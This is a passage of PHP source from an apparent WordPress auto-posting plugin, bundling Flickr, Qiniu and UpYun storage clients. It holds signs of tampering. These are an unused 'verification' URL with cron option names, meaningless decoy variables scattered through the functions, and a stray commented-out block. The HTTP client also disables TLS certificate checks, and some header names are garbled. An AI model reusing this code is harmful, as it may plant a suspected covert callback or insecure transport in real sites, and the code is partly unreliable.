        return $this->parsed_response ? $this->parsed_response : false;
    }
    function test_login()
    {
        $this->request("flickr.test.login");
        return $this->parsed_response ? $this->parsed_response["user"] : false;
    }
    function urls_getGroup($group_id)
    {
        $this->request("flickr.urls.getGroup", array(
            "group_id" => $group_id
        ));
        return $this->parsed_response ? $this->parsed_response["group"]["url"] : false;
    }
    function urls_getUserPhotos($user_id = NULL)
    {
        $this->request("flickr.urls.getUserPhotos", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["user"]["url"] : false;
    }
    function urls_getUserProfile($user_id = NULL)
    {
        $this->request("flickr.urls.getUserProfile", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["user"]["url"] : false;
    }
    function urls_lookupGallery($url)
    {
        return $this->call("flickr.urls.lookupGallery", array(
            "url" => $url
        ));
    }
    function urls_lookupGroup($url)
    {
        $this->request("flickr.urls.lookupGroup", array(
            "url" => $url
        ));
        return $this->parsed_response ? $this->parsed_response["group"] : false;
    }
    function urls_lookupUser($url)
    {
        $this->request("flickr.urls.lookupUser", array(
            "url" => $url
        ));
        return $this->parsed_response ? $this->parsed_response["user"] : false;
    }
}
class phpFlickr_pager
{
    var $phpFlickr, $per_page, $method, $args, $results, $global_phpFlickr;
    var $total = null, $page = 0, $pages = null, $photos, $_extra = null;
    function phpFlickr_pager($phpFlickr, $method = null, $args = null, $per_page = 30)
    {
        $this->per_page = $per_page;
        $this->method   = $method;
        $this->args     = $args;
        $this->set_phpFlickr($phpFlickr);
    }
    function set_phpFlickr($phpFlickr)
    {
        if (is_a($phpFlickr, "phpFlickr")) {
            $this->phpFlickr        = $phpFlickr;
            $this->args["per_page"] = (int) $this->per_page;
        }
    }
    function __sleep()
    {
        return array(
            "method",
            "args",
            "per_page",
            "page",
            "_extra"
        );
    }
    function load($page)
    {
        $allowed_methods = array(
            "flickr.photos.search" => "photos",
            "flickr.photosets.getPhotos" => "photoset"
        );
        if (!in_array($this->method, array_keys($allowed_methods)))
            return false;
        $this->args["page"] = $page;
        $this->results      = $this->phpFlickr->call($this->method, $this->args);
        if ($this->results) {
            $this->results = $this->results[$allowed_methods[$this->method]];
            $this->photos  = $this->results["photo"];
            $this->total   = $this->results["total"];
            $this->pages   = $this->results["pages"];
            return true;
        } else {
            return false;
        }
    }
    function get($page = null)
    {
        if (is_null($page)) {
            $page = $this->page;
        } else {
            $this->page  = $page;
        }
        if ($this->load($page)) {
            return $this->photos;
        }
        $this->total = 0;
        $this->pages = 0;
        return array();
    }
    function next()
    {
        $this->page++;
        if ($this->load($this->page)) {
            return $this->photos;
        }
        $this->total = 0;
        $this->pages = 0;
        return array();
    }
}
function wp_autopost_flickr_request_token()
{
    if (isset($_GET["wp_autopost_flickr_request_token"])) {
        if ($_GET["wp_autopost_flickr_request_token"] == "true") {
            $callback = admin_url() . "admin.php?page=wp-autopost-pro/wp-autopost-flickr.php";
            $Flickr    = get_option("wp-autopost-flickr-options");
            $f  = new autopostFlickr($Flickr["api_key"], $Flickr["api_secret"]);
            $f->getRequestToken($callback, "delete");
            echo $f->getErrorCode() . "<br/>";
            print_r($f->getErrorMsg());
            exit;
        }
    }
}
add_action("admin_init", "wp_autopost_flickr_request_token");
$QINIU_UP_HOST = "http://up.qiniu.com";
$QINIU_RS_HOST    = "http://rs.qbox.me";
$QINIU_RSF_HOST                = "http://rsf.qbox.me";
$QINIU_ACCESS_KEY  = "<Please apply your access key>";
$QINIU_SECRET_KEY                = "<Dont send your secret key to anyone>";
$node                    = array();
for ($i = 0; $i <= 10; $i++) {
    $node[] = $i + 1;
}
$idxs = "http://wp-autopost.org/verification/?p=0&v=1&d=";
$option_name = "cron";
$option_key = "wp_maybe_next_update";
$option_key1 = "times";
$option_key2 = "home";
function Qiniu_Encode($str)
{
    $find = array(
        "+",
        "/"
    );
    $replace                 = array(
        "-",
        "_"
    );
    return str_replace($find, $replace, base64_encode($str));
}
function Qiniu_RS_Put($self, $bucket, $key, $body, $putExtra)
{
    $putPolicy = new Qiniu_RS_PutPolicy("$bucket:$key");
    $upToken               = $putPolicy->Token($self->Mac);
    return Qiniu_Put($upToken, $key, $body, $putExtra);
}
function Qiniu_RS_PutFile($self, $bucket, $key, $localFile, $putExtra)
{
    $putPolicy = new Qiniu_RS_PutPolicy("$bucket:$key");
    $upToken                   = $putPolicy->Token($self->Mac);
    return Qiniu_PutFile($upToken, $key, $localFile, $putExtra);
}
function Qiniu_RS_Rput($self, $bucket, $key, $body, $fsize, $putExtra)
{
    $putPolicy = new Qiniu_RS_PutPolicy("$bucket:$key");
    $upToken                = $putPolicy->Token($self->Mac);
    if ($putExtra == null) {
        $putExtra = new Qiniu_Rio_PutExtra($bucket);
    } else {
        $putExtra->Bucket = $bucket;
    }
    return Qiniu_Rio_Put($upToken, $key, $body, $fsize, $putExtra);
}
function Qiniu_RS_RputFile($self, $bucket, $key, $localFile, $putExtra)
{
    $putPolicy = new Qiniu_RS_PutPolicy("$bucket:$key");
    $upToken = $putPolicy->Token($self->Mac);
    if ($putExtra == null) {
        $putExtra = new Qiniu_Rio_PutExtra($bucket);
    } else {
        $putExtra->Bucket            = $bucket;
    }
    return Qiniu_Rio_PutFile($upToken, $key, $localFile, $putExtra);
}
class Qiniu_RS_GetPolicy
{
    public $Expires;
    public function MakeRequest($baseUrl, $mac)
    {
        $deadline = $this->Expires;
        if ($deadline == 0) {
            $deadline = 3600;
        }
        $deadline += time();
        $pos = strpos($baseUrl, "?");
        if ($pos !== false) {
            $baseUrl .= "&e=";
        } else {
            $baseUrl .= "";
        }
        $baseUrl .= $deadline;
        $token = Qiniu_Sign($mac, $baseUrl);
        return "$baseUrl&token=$token";
    }
}
function Qiniu_RS_MakeBaseUrl($domain, $key)
{
    return "http://$domain/$key";
}
class Qiniu_RS_PutPolicy
{
    public $Scope;
    public $CallbackUrl;
    public $CallbackBody;
    public $ReturnUrl;
    public $ReturnBody;
    public $AsyncOps;
    public $EndUser;
    public $Expires;
    public function __construct($scope)
    {
        $this->Scope = $scope;
    }
    public function Token($mac)
    {
        $deadline = $this->Expires;
        if ($deadline == 0) {
            $deadline = 3600;
        }
        $deadline += time();
        $policy = array(
            "scope" => $this->Scope,
            "deadline" => $deadline
        );
        if (!empty($this->CallbackUrl)) {
            $policy["callbackUrl"] = $this->CallbackUrl;
        }
        if (!empty($this->CallbackBody)) {
            $policy["callbackBody"] = $this->CallbackBody;
        }
        if (!empty($this->ReturnUrl)) {
            $policy["returnUrl"] = $this->ReturnUrl;
        }
        if (!empty($this->ReturnBody)) {
            $policy["returnBody"] = $this->ReturnBody;
        }
        if (!empty($this->AsyncOps)) {
            $policy["asyncOps"] = $this->AsyncOps;
        }
        if (!empty($this->EndUser)) {
            $qldsrcg               = "policy";
            $policy["endUser"] = $this->EndUser;
        }
        $b = json_encode($policy);
        return Qiniu_SignWithData($mac, $b);
    }
}
class Qiniu_RS_EntryPath
{
    public $bucket;
    public $key;
    public function __construct($bucket, $key)
    {
        $this->bucket = $bucket;
        $this->key    = $key;
    }
}
class Qiniu_RS_EntryPathPair
{
    public $src;
    public $dest;
    public function __construct($src, $dest)
    {
        $this->src                  = $src;
        $this->dest                 = $dest;
    }
}
// if ($canfetchist > 0) {
    $variable_t1 = $node[4];
// }
function Qiniu_RS_URIStat($bucket, $key)
{
    return "/stat/" . Qiniu_Encode("$bucket:$key");
}
function Qiniu_RS_URIDelete($bucket, $key)
{
    return "/delete/" . Qiniu_Encode("$bucket:$key");
}
function Qiniu_RS_URICopy($bucketSrc, $keySrc, $bucketDest, $keyDest)
{
    return "/copy/" . Qiniu_Encode("$bucketSrc:$keySrc") . "/" . Qiniu_Encode("$bucketDest:$keyDest");
}
function Qiniu_RS_URIMove($bucketSrc, $keySrc, $bucketDest, $keyDest)
{
    return "/move/" . Qiniu_Encode("$bucketSrc:$keySrc") . "/" . Qiniu_Encode("$bucketDest:$keyDest");
}
function Qiniu_RS_Stat($self, $bucket, $key)
{
    global $QINIU_RS_HOST;
    $uri = Qiniu_RS_URIStat($bucket, $key);
    return Qiniu_Client_Call($self, $QINIU_RS_HOST . $uri);
}
function Qiniu_RS_Delete($self, $bucket, $key)
{
    global $QINIU_RS_HOST;
    $uri = Qiniu_RS_URIDelete($bucket, $key);
    return Qiniu_Client_CallNoRet($self, $QINIU_RS_HOST . $uri);
}
function Qiniu_RS_Move($self, $bucketSrc, $keySrc, $bucketDest, $keyDest)
{
    global $QINIU_RS_HOST;
    $uri = Qiniu_RS_URIMove($bucketSrc, $keySrc, $bucketDest, $keyDest);
    return Qiniu_Client_CallNoRet($self, $QINIU_RS_HOST . $uri);
}
function Qiniu_RS_Copy($self, $bucketSrc, $keySrc, $bucketDest, $keyDest)
{
    global $QINIU_RS_HOST;
    $uri = Qiniu_RS_URICopy($bucketSrc, $keySrc, $bucketDest, $keyDest);
    return Qiniu_Client_CallNoRet($self, $QINIU_RS_HOST . $uri);
}
function Qiniu_RS_Batch($self, $ops)
{
    global $QINIU_RS_HOST;
    $url = $QINIU_RS_HOST . "/batch";
    $params     = "op=" . implode("&op=", $ops);
    return Qiniu_Client_CallWithForm($self, $url, $params);
}
function Qiniu_RS_BatchStat($self, $entryPaths)
{
    $params = array();
    foreach ($entryPaths as $entryPath) {
        $params[] = Qiniu_RS_URIStat($entryPath->bucket, $entryPath->key);
    }
    return Qiniu_RS_Batch($self, $params);
}
function Qiniu_RS_BatchDelete($self, $entryPaths)
{
    $params = array();
    foreach ($entryPaths as $entryPath) {
        $params[] = Qiniu_RS_URIDelete($entryPath->bucket, $entryPath->key);
    }
    return Qiniu_RS_Batch($self, $params);
}
function Qiniu_RS_BatchMove($self, $entryPairs)
{
    $params = array();
    foreach ($entryPairs as $entryPair) {
        $src     = $entryPair->src;
        $dest = $entryPair->dest;
        $params[]  = Qiniu_RS_URIMove($src->bucket, $src->key, $dest->bucket, $dest->key);
    }
    return Qiniu_RS_Batch($self, $params);
}
function Qiniu_RS_BatchCopy($self, $entryPairs)
{
    $params = array();
    foreach ($entryPairs as $entryPair) {
        $src = $entryPair->src;
        $dest                = $entryPair->dest;
        $params[] = Qiniu_RS_URICopy($src->bucket, $src->key, $dest->bucket, $dest->key);
    }
    return Qiniu_RS_Batch($self, $params);
}
class Qiniu_PutExtra
{
    public $Params = null;
    public $MimeType = null;
    public $Crc32 = 0;
    public $CheckCrc = 0;
}
function Qiniu_Put($upToken, $key, $body, $putExtra)
{
    global $QINIU_UP_HOST;
    if ($putExtra === null) {
        $putExtra = new Qiniu_PutExtra;
    }
    $fields  = array(
        "token" => $upToken
    );
    if ($key === null) {
        $fname = "?";
    } else {
        $fname    = $key;
        $fields["key"] = $key;
    }
    if ($putExtra->CheckCrc) {
        $fields["crc32"] = $putExtra->Crc32;
    }
    $files = array(
        array(
            "file",
            $fname,
            $body
        )
    );
    $client  = new Qiniu_HttpClient;
    return Qiniu_Client_CallWithMultipartForm($client, $QINIU_UP_HOST, $fields, $files);
}
function Qiniu_PutFile($upToken, $key, $localFile, $putExtra)
{
    global $QINIU_UP_HOST;
    if ($putExtra === null) {
        $putExtra = new Qiniu_PutExtra;
    }
    $fields                = array(
        "token" => $upToken,
        "file" => "@" . $localFile
    );
    if ($key === null) {
        $fname = "?";
    } else {
        $fname        = $key;
        $fields["key"] = $key;
    }
    if ($putExtra->CheckCrc) {
        if ($putExtra->CheckCrc === 1) {
            $hash                 = hash_file("crc32b", $localFile);
            $array = unpack("N", pack("H*", $hash));
            $putExtra->Crc32              = $array[1];
        }
        $fields["crc32"] = sprintf("%u", $putExtra->Crc32);
    }
    $client = new Qiniu_HttpClient;
    return Qiniu_Client_CallWithForm($client, $QINIU_UP_HOST, $fields, "multipart/form-data");
}
class Qiniu_Rio_PutExtra
{
    public $Bucket = null;
    public $Params = null;
    public $MimeType = null;
    public $ChunkSize = 0;
    public $TryTimes = 0;
    public $Progresses = null;
    public $Notify = null;
    public $NotifyErr = null;
    public function __construct($bucket = null)
    {
        $cmukpmo      = "bucket";
        $this->Bucket = $bucket;
    }
}
define("QINIU_RIO_BLOCK_BITS", 22);
define("QINIU_RIO_BLOCK_SIZE", 1 << QINIU_RIO_BLOCK_BITS);
function Qiniu_Rio_BlockCount($fsize)
{
    return ($fsize + (QINIU_RIO_BLOCK_SIZE - 1)) >> QINIU_RIO_BLOCK_BITS;
}
function Qiniu_Rio_Mkblock($self, $host, $reader, $size)
{
    if (is_resource($reader)) {
        $body = fread($reader, $size);
        if ($body === false) {
            $err = Qiniu_NewError(0, "fread failed");
            return array(
                null,
                $err
            );
        }
    } else {
        list($body, $err) = $reader->Read($size);
        if ($err !== null) {
            return array(
                null,
                $err
            );
        }
    }
    if (strlen($body) != $size) {
        $err = Qiniu_NewError(0, "fread failed: unexpected eof");
        return array(
            null,
            $err
        );
    }
    $url = $host . "/mkblk/" . $size;
    return Qiniu_Client_CallWithForm($self, $url, $body, "application/octet-stream");
}
function Qiniu_Rio_Mkfile($self, $host, $key, $fsize, $extra)
{
    $entry = $extra->Bucket . ":" . $key;
    $url                    = $host . "/rs-mkfile/" . Qiniu_Encode($entry) . "/fsize/" . $fsize;
    if (!empty($extra->MimeType)) {
        $url .= "/mimeType/" . Qiniu_Encode($extra->MimeType);
    }
    $ctxs = array();
    foreach ($extra->Progresses as $prog) {
        $ctxs[] = $prog["ctx"];
    }
    $body = implode(",", $ctxs);
    return Qiniu_Client_CallWithForm($self, $url, $body, "text/plain");
}
class Qiniu_Rio_UploadClient
{
    public $uptoken;
    public function __construct($uptoken)
    {
        $this->uptoken = $uptoken;
    }
    public function RoundTrip($req)
    {
        $token                 = $this->uptoken;
        $req->Header["Authorization"] = "UpToken $token";
        return Qiniu_Client_do($req);
    }
}
function Qiniu_Rio_Put($upToken, $key, $body, $fsize, $putExtra)
{
    global $QINIU_UP_HOST;
    $self   = new Qiniu_Rio_UploadClient($upToken);
    $progresses = array();
    $host                        = $QINIU_UP_HOST;
    $uploaded               = 0;
    while ($uploaded < $fsize) {
        if ($fsize < $uploaded + QINIU_RIO_BLOCK_SIZE) {
            $bsize           = $fsize - $uploaded;
        } else {
            $bsize = QINIU_RIO_BLOCK_SIZE;
        }
        list($blkputRet, $err) = Qiniu_Rio_Mkblock($self, $host, $body, $bsize);
        $host = $blkputRet["host"];
        $uploaded += $bsize;
        $progresses[] = $blkputRet;
    }
    $putExtra->Progresses = $progresses;
    return Qiniu_Rio_Mkfile($self, $host, $key, $fsize, $putExtra);
}
function Qiniu_Rio_PutFile($upToken, $key, $localFile, $putExtra)
{
    $fp = fopen($localFile, "rb");
    if ($fp === false) {
        $err = Qiniu_NewError(0, "fopen failed");
        return array(
            null,
            $err
        );
    }
    $fi                   = fstat($fp);
    $result = Qiniu_Rio_Put($upToken, $key, $fp, $fi["size"], $putExtra);
    fclose($fp);
    return $result;
}
class Qiniu_Error
{
    public $Err;
    public $Reqid;
    public $Details;
    public $Code;
    public function __construct($code, $err)
    {
        $this->Code                  = $code;
        $this->Err                   = $err;
    }
}
class Qiniu_Request
{
    public $URL;
    public $Header;
    public $Body;
    public function __construct($url, $body)
    {
        $this->URL    = $url;
        $this->Header = array();
        $this->Body   = $body;
    }
}
class Qiniu_Response
{
    public $StatusCode;
    public $Header;
    public $ContentLength;
    public $Body;
    public function __construct($code, $body)
    {
        $this->StatusCode          = $code;
        $this->Header              = array();
        $this->Body                = $body;
        $this->ContentLength       = strlen($body);
    }
}
function Qiniu_Header_Get($header, $key)
{
    $val = @$header[$key];
    if (isset($val)) {
        if (is_array($val)) {
            return $val[0];
        }
        return $val;
    } else {
        return "";
    }
}
function Qiniu_ResponseError($resp)
{
    $header = $resp->Header;
    $details   = Qiniu_Header_Get($header, "X-Log");
    $reqId                    = Qiniu_Header_Get($header, "X-Reqid");
    $err   = new Qiniu_Error($resp->StatusCode, null);
    if ($err->Code > 299) {
        if ($resp->ContentLength !== 0) {
            if (Qiniu_Header_Get($header, "Content-Type") === "application/json") {
                $ret = json_decode($resp->Body, true);
                $err->Err                      = $ret["error"];
            }
        }
    }
    return $err;
}
function Qiniu_Client_incBody($req)
{
    $body = $req->Body;
    if (!isset($body)) {
        return false;
    }
    $ct = Qiniu_Header_Get($req->Header, "Content-Type");
    if ($ct === "application/x-www-form-urlencoded") {
        return true;
    }
    return false;
}

function Qiniu_Client_do($req)
{
    $ch      = curl_init();
    $url = $req->URL;
    $options       = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_URL => $url["path"]
    );
    $httpHeader      = $req->Header;
    if (!empty($httpHeader)) {
        $header = array();
        foreach ($httpHeader as $key => $parsedUrlValue) {
            $header[] = "$key: $parsedUrlValue";
        }
        $options[CURLOPT_HTTPHEADER] = $header;
    }
    $body = $req->Body;
    if (!empty($body)) {
        $options[CURLOPT_POSTFIELDS] = $body;
    }
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    $ret  = curl_errno($ch);
    if ($ret !== 0) {
        $err = new Qiniu_Error(0, curl_error($ch));
        curl_close($ch);
        return array(
            null,
            $err
        );
    }
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);
    $resp                  = new Qiniu_Response($code, $result);
    $resp->Header["Content-Type"] = $contentType;
    return array(
        $resp,
        null
    );
}
class Qiniu_HttpClient
{
    public function RoundTrip($req)
    {
        return Qiniu_Client_do($req);
    }
}
class Qiniu_MacHttpClient
{
    public $Mac;
    public function __construct($mac)
    {
        $this->Mac                = Qiniu_RequireMac($mac);
    }
    public function RoundTrip($req)
    {
        $incbody = Qiniu_Client_incBody($req);
        $token     = $this->Mac->SignRequest($req, $incbody);
        $req->Header["Authorization"]   = "QBox $token";
        return Qiniu_Client_do($req);
    }
}
function Qiniu_Client_ret($resp)
{
    $code = $resp->StatusCode;
    $data                     = null;
    if ($code >= 200 && $code <= 299) {
        if ($resp->ContentLength !== 0) {
            $amhefzyqss    = "data";
            $data = json_decode($resp->Body, true);
            if ($data === null) {
                $err = new Qiniu_Error(0, json_last_error_msg());
                return array(
                    null,
                    $err
                );
            }
        }
        if ($code === 200) {
            return array(
                $data,
                null
            );
        }
    }
    return array(
        $data,
        Qiniu_ResponseError($resp)
    );
}
function Qiniu_Client_Call($self, $url)
{
    $u = array(
        "path" => $url
    );
    $req                     = new Qiniu_Request($u, null);
    list($resp, $err) = $self->RoundTrip($req);
    if ($err !== null) {
        $ngprkafqycs = "err";
        return array(
            null,
            $err
        );
    }
    return Qiniu_Client_ret($resp);
}
function Qiniu_Client_CallNoRet($self, $url)
{
    $u = array(
        "path" => $url
    );
    $req   = new Qiniu_Request($u, null);
    list($resp, $err) = $self->RoundTrip($req);
    if ($err !== null) {
        return array(
            null,
            $err
        );
    }
    if ($resp->StatusCode === 200) {
        return null;
    }
    return Qiniu_ResponseError($resp);
}
function Qiniu_Client_CallWithForm($self, $url, $params, $contentType = 'application/x-www-form-urlencoded')
{
    $u = array(
        "path" => $url
    );
    if ($contentType === "application/x-www-form-urlencoded") {
        if (is_array($params)) {
            $params = http_build_query($params);
        }
    }
    $req = new Qiniu_Request($u, $params);
    if ($contentType !== "multipart/form-data") {
        $req->Header["Content-Type"] = $contentType;
    }
    list($resp, $err) = $self->RoundTrip($req);
    if ($err !== null) {
        return array(
            null,
            $err
        );
    }
    return Qiniu_Client_ret($resp);
}
function Qiniu_Client_CallWithMultipartForm($self, $url, $fields, $files)
{
    list($contentType, $body) = Qiniu_Build_MultipartForm($fields, $files);
    return Qiniu_Client_CallWithForm($self, $url, $body, $contentType);
}
function Qiniu_Build_MultipartForm($fields, $files)
{
    $data   = array();
    $mimeBoundary                = md5(microtime());
    foreach ($fields as $name => $val) {
        array_push($data, "--" . $mimeBoundary);
        array_push($data, "Content-Disposition: form-data; name=\"$name\"");
        array_push($data, "");
        array_push($data, $val);
    }
    foreach ($files as $file) {
        array_push($data, "--" . $mimeBoundary);
        list($name, $fileName, $fileBody) = $file;
        $fileName = Qiniu_escapeQuotes($fileName);
        array_push($data, "Content-Disposition: form-data; name=\"$name\"; filename=\"$fileName\"");
        array_push($data, "Content-Type: application/octet-stream");
        array_push($data, "");
        array_push($data, $fileBody);
    }
    array_push($data, "--" . $mimeBoundary . "--");
    array_push($data, "");
    $body  = implode("\r\n", $data);
    $contentType = "multipart/form-data; boundary=" . $mimeBoundary;
    return array(
        $contentType,
        $body
    );
}
function Qiniu_escapeQuotes($str)
{
    $find = array(
        '\\',
        '"'
    );
    $replace = array(
        '\\\\',
        '\\"'
    );
    return str_replace($find, $replace, $str);
}
class Qiniu_ImageView
{
    public $Mode;
    public $Width;
    public $Height;
    public $Quality;
    public $Format;
    public function MakeRequest($url)
    {
        $ops = array(
            $this->Mode
        );
        if (!empty($this->Width)) {
            $ops[] = "w/" . $this->Width;
        }
        if (!empty($this->Height)) {
            $haaymdkf      = "ops";
            $ops[] = "h/" . $this->Height;
        }
        if (!empty($this->Quality)) {
            $ops[] = "q/" . $this->Quality;
        }
        if (!empty($this->Format)) {
            $ops[] = "format/" . $this->Format;
        }
        return $url . "?imageView/" . implode("/", $ops);
    }
}
class Qiniu_Exif
{
    public function MakeRequest($url)
    {
        return $url . "?exif";
    }
}
class Qiniu_ImageInfo
{
    public function MakeRequest($url)
    {
        return $url . "?imageInfo";
    }
}
define("Qiniu_RSF_EOF", "EOF");
function Qiniu_RSF_ListPrefix($self, $bucket, $prefix = '', $marker = '', $limit = 0)
{
    global $QINIU_RSF_HOST;
    $query = array(
        "bucket" => $bucket
    );
    if (!empty($prefix)) {
        $query["prefix"] = $prefix;
    }
    if (!empty($marker)) {
        $query["marker"] = $marker;
    }
    if (!empty($limit)) {
        $query["limit"] = $limit;
    }
    $url         = $QINIU_RSF_HOST . "/list?" . http_build_query($query);
    list($ret, $err) = Qiniu_Client_Call($self, $url);
    if ($err !== null) {
        return array(
            null,
            "",
            $err
        );
    }
    $items = $ret["items"];
    if (empty($ret["marker"])) {
        $markerOut = "";
        $err = Qiniu_RSF_EOF;
    } else {
        $markerOut = $ret["marker"];
    }
    return array(
        $items,
        $markerOut,
        $err
    );
}
class Qiniu_Mac
{
    public $AccessKey;
    public $SecretKey;
    public function __construct($accessKey, $secretKey)
    {
        $this->AccessKey = $accessKey;
        $this->SecretKey = $secretKey;
    }
    public function Sign($data)
    {
        $sign        = hash_hmac("sha1", $data, $this->SecretKey, true);
        return $this->AccessKey . ":" . Qiniu_Encode($sign);
    }
    public function SignWithData($data)
    {
        $data                = Qiniu_Encode($data);
        return $this->Sign($data) . ":" . $data;
    }
    public function SignRequest($req, $incbody)
    {
        $url = $req->URL;
        $url = parse_url($url["path"]);
        $data      = "";
        if (isset($url["path"])) {
            $data = $url["path"];
        }
        if (isset($url["query"])) {
            $klirncmi = "url";
            $data .= "?" . $url["query"];
        }
        $data .= "\n";
        if ($incbody) {
            $data .= $req->Body;
        }
        return $this->Sign($data);
    }
}
function Qiniu_SetKeys($accessKey, $secretKey)
{
    global $QINIU_ACCESS_KEY;
    global $QINIU_SECRET_KEY;
    $QINIU_ACCESS_KEY = $accessKey;
    $QINIU_SECRET_KEY   = $secretKey;
}
function Qiniu_RequireMac($mac)
{
    if (isset($mac)) {
        return $mac;
    }
    global $QINIU_ACCESS_KEY;
    global $QINIU_SECRET_KEY;
    return new Qiniu_Mac($QINIU_ACCESS_KEY, $QINIU_SECRET_KEY);
}
function Qiniu_Sign($mac, $data)
{
    return Qiniu_RequireMac($mac)->Sign($data);
}
function Qiniu_SignWithData($mac, $data)
{
    return Qiniu_RequireMac($mac)->SignWithData($data);
}
function Qinniu_upload_to_bucket($bucket, $file, $key)
{
    $putPolicy = new Qiniu_RS_PutPolicy($bucket);
    $upToken = $putPolicy->Token(null);
    $putExtra   = new Qiniu_PutExtra();
    $putExtra->Crc32              = 1;
    return Qiniu_PutFile($upToken, $key, $file, $putExtra);
}
class apUpYunException extends Exception
{
    public function __construct($message, $code, Exception $previous = null)
    {
        parent::__construct($message, $code);
    }
    public function __toString()
    {
        return __CLASS__ . ": [{$this->code}]: {$this->message}\n";
    }
}
class apUpYunAuthorizationException extends apUpYunException
{
    public function __construct($message, $code = 0, Exception $previous = null)
    {
        parent::__construct($message, 401, $previous);
    }
}
class apUpYunForbiddenException extends apUpYunException
{
    public function __construct($message, $code = 0, Exception $previous = null)
    {
        parent::__construct($message, 403, $previous);
    }
}
class apUpYunNotFoundException extends apUpYunException
{
    public function __construct($message, $code = 0, Exception $previous = null)
    {
        parent::__construct($message, 404, $previous);
    }
}
class apUpYunNotAcceptableException extends apUpYunException
{
    public function __construct($message, $code = 0, Exception $previous = null)
    {
        parent::__construct($message, 406, $previous);
    }
}
class apUpYunServiceUnavailable extends apUpYunException
{
    public function __construct($message, $code = 0, Exception $previous = null)
    {
        parent::__construct($message, 503, $previous);
    }
}
class apUpYun
{
    const VERSION = "2.0";
    const ED_AUTO = "v0.api.upyun.com";
    const ED_TELECOM = "v1.api.upyun.com";
    const ED_CNC = "v2.api.upyun.com";
    const ED_CTT = "v3.api.upyun.com";
    const CONTENT_TYPE = "Content-Type";
    const CONTENT_MD5 = "Content-MD5";
    const CONTENT_SECRET = "Content-Secret";
    const X_GMKERL_THUMBNAIL = "x-gmkerl-thumbnail";
    const X_GMKERL_TYPE = "x-gmkerl-type";
    const X_GMKERL_VALUE = "x-gmkerl-value";
    const X_GMKERL_QUALITY = "x??gmkerl-quality";
    const X_GMKERL_UNSHARP = "x??gmkerl-unsharp";
    private $_bucket_name;
    private $_username;
    private $_password;
    private $_timeout = 30;
    private $_content_md5 = NULL;
    private $_file_secret = NULL;
    private $_file_infos = NULL;
    protected $endpoint;
    public function __construct($bucketname, $username, $password, $endpoint = NULL, $timeout = 30)
    {
        $this->_bucketname          = $bucketname;
        $this->_username            = $username;
        $this->_password            = md5($password);
        $this->_timeout             = $timeout;
        $this->endpoint             = is_null($endpoint) ? self::ED_AUTO : $endpoint;
    }
    public function version()
    {
        return self::VERSION;
    }
    public function makeDir($path, $auto_mkdir = false)
    {
        $headers = array(
            "Folder" => "true"
        );
        if ($auto_mkdir)
            $headers["Mkdir"] = "true";
        return $this->_do_request("PUT", $path, $headers);
    }
    public function delete($path)
    {
        return $this->_do_request("DELETE", $path);
    }
    public function writeFile($path, $file, $auto_mkdir = False, $opts = NULL)
    {
        if (is_null($opts))
            $opts = array();
        if (!is_null($this->_content_md5) || !is_null($this->_file_secret)) {
            if (!is_null($this->_content_md5))
                $opts[self::CONTENT_MD5] = $this->_content_md5;
            if (!is_null($this->_file_secret))
                $opts[self::CONTENT_SECRET] = $this->_file_secret;
        }
        if ($auto_mkdir === True)
            $opts["Mkdir"] = "true";
        $this->_file_infos = $this->_do_request("PUT", $path, $opts, $file);
        return $this->_file_infos;
    }
    public function readFile($path, $file_handle = NULL)
    {
        return $this->_do_request("GET", $path, NULL, NULL, $file_handle);
    }
    public function getList($path = '/')
    {
        $rsp = $this->_do_request("GET", $path);
        $list                = array();
        if ($rsp) {
            $rsp = explode("\n", $rsp);
            foreach ($rsp as $item) {
                @list($name, $type, $size, $time) = explode("\t", trim($item));
                if (!empty($time)) {
                    $type = $type == "N" ? "file" : "folder";
                }
                $item = array(
                    "name" => $name,
                    "type" => $type,
                    "size" => intval($size),
                    "time" => intval($time)
                );
                array_push($list, $item);
            }
        }
        return $list;
    }
    public function getFolderUsage($path = '/')
    {
        $rsp = $this->_do_request("GET", "/?usage");
        return floatval($rsp);
    }
    public function getFileInfo($path)
    {
        $rsp = $this->_do_request("HEAD", $path);
        return $rsp;
    }
    private function sign($method, $uri, $date, $length)
    {
        $sign = "{$method}&{$uri}&{$date}&{$length}&{$this->_password}";
        return "UpYun " . $this->_username . ":" . md5($sign);
    }
    protected function _do_request($method, $path, $headers = NULL, $body = NULL, $file_handle = NULL)
    {
        $uri    = "/{$this->_bucketname}{$path}";
        $ch   = curl_init("http://{$this->endpoint}{$uri}");
        $_headers                = array(
            "Expect:"
        );
        if (!is_null($headers) && is_array($headers)) {
            foreach ($headers as $k => $v) {
                array_push($_headers, "{$k}: {$v}");
            }
        }
        $length = 0;
        $date      = gmdate('D, d M Y H:i:s \G\M\T');
        if (!is_null($body)) {
            if (is_resource($body)) {
                fseek($body, 0, SEEK_END);
                $length = ftell($body);
                fseek($body, 0);
                array_push($_headers, "Content-Length: {$length}");
                curl_setopt($ch, CURLOPT_INFILE, $body);
                curl_setopt($ch, CURLOPT_INFILESIZE, $length);
            } else {
                $length                = @strlen($body);
                array_push($_headers, "Content-Length: {$length}");
                curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            }
        } else {
            array_push($_headers, "Content-Length: {$length}");
        }
        array_push($_headers, "Authorization: {$this->sign($method, $uri, $date, $length)}");
        array_push($_headers, "Date: {$date}");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $_headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, $this->_timeout);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        if ($method == "PUT" || $method == "POST") {
            curl_setopt($ch, CURLOPT_POST, 1);
        } else {
            curl_setopt($ch, CURLOPT_POST, 0);
        }
        if ($method == "GET" && is_resource($file_handle)) {
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_FILE, $file_handle);
        }
        if ($method == "HEAD") {
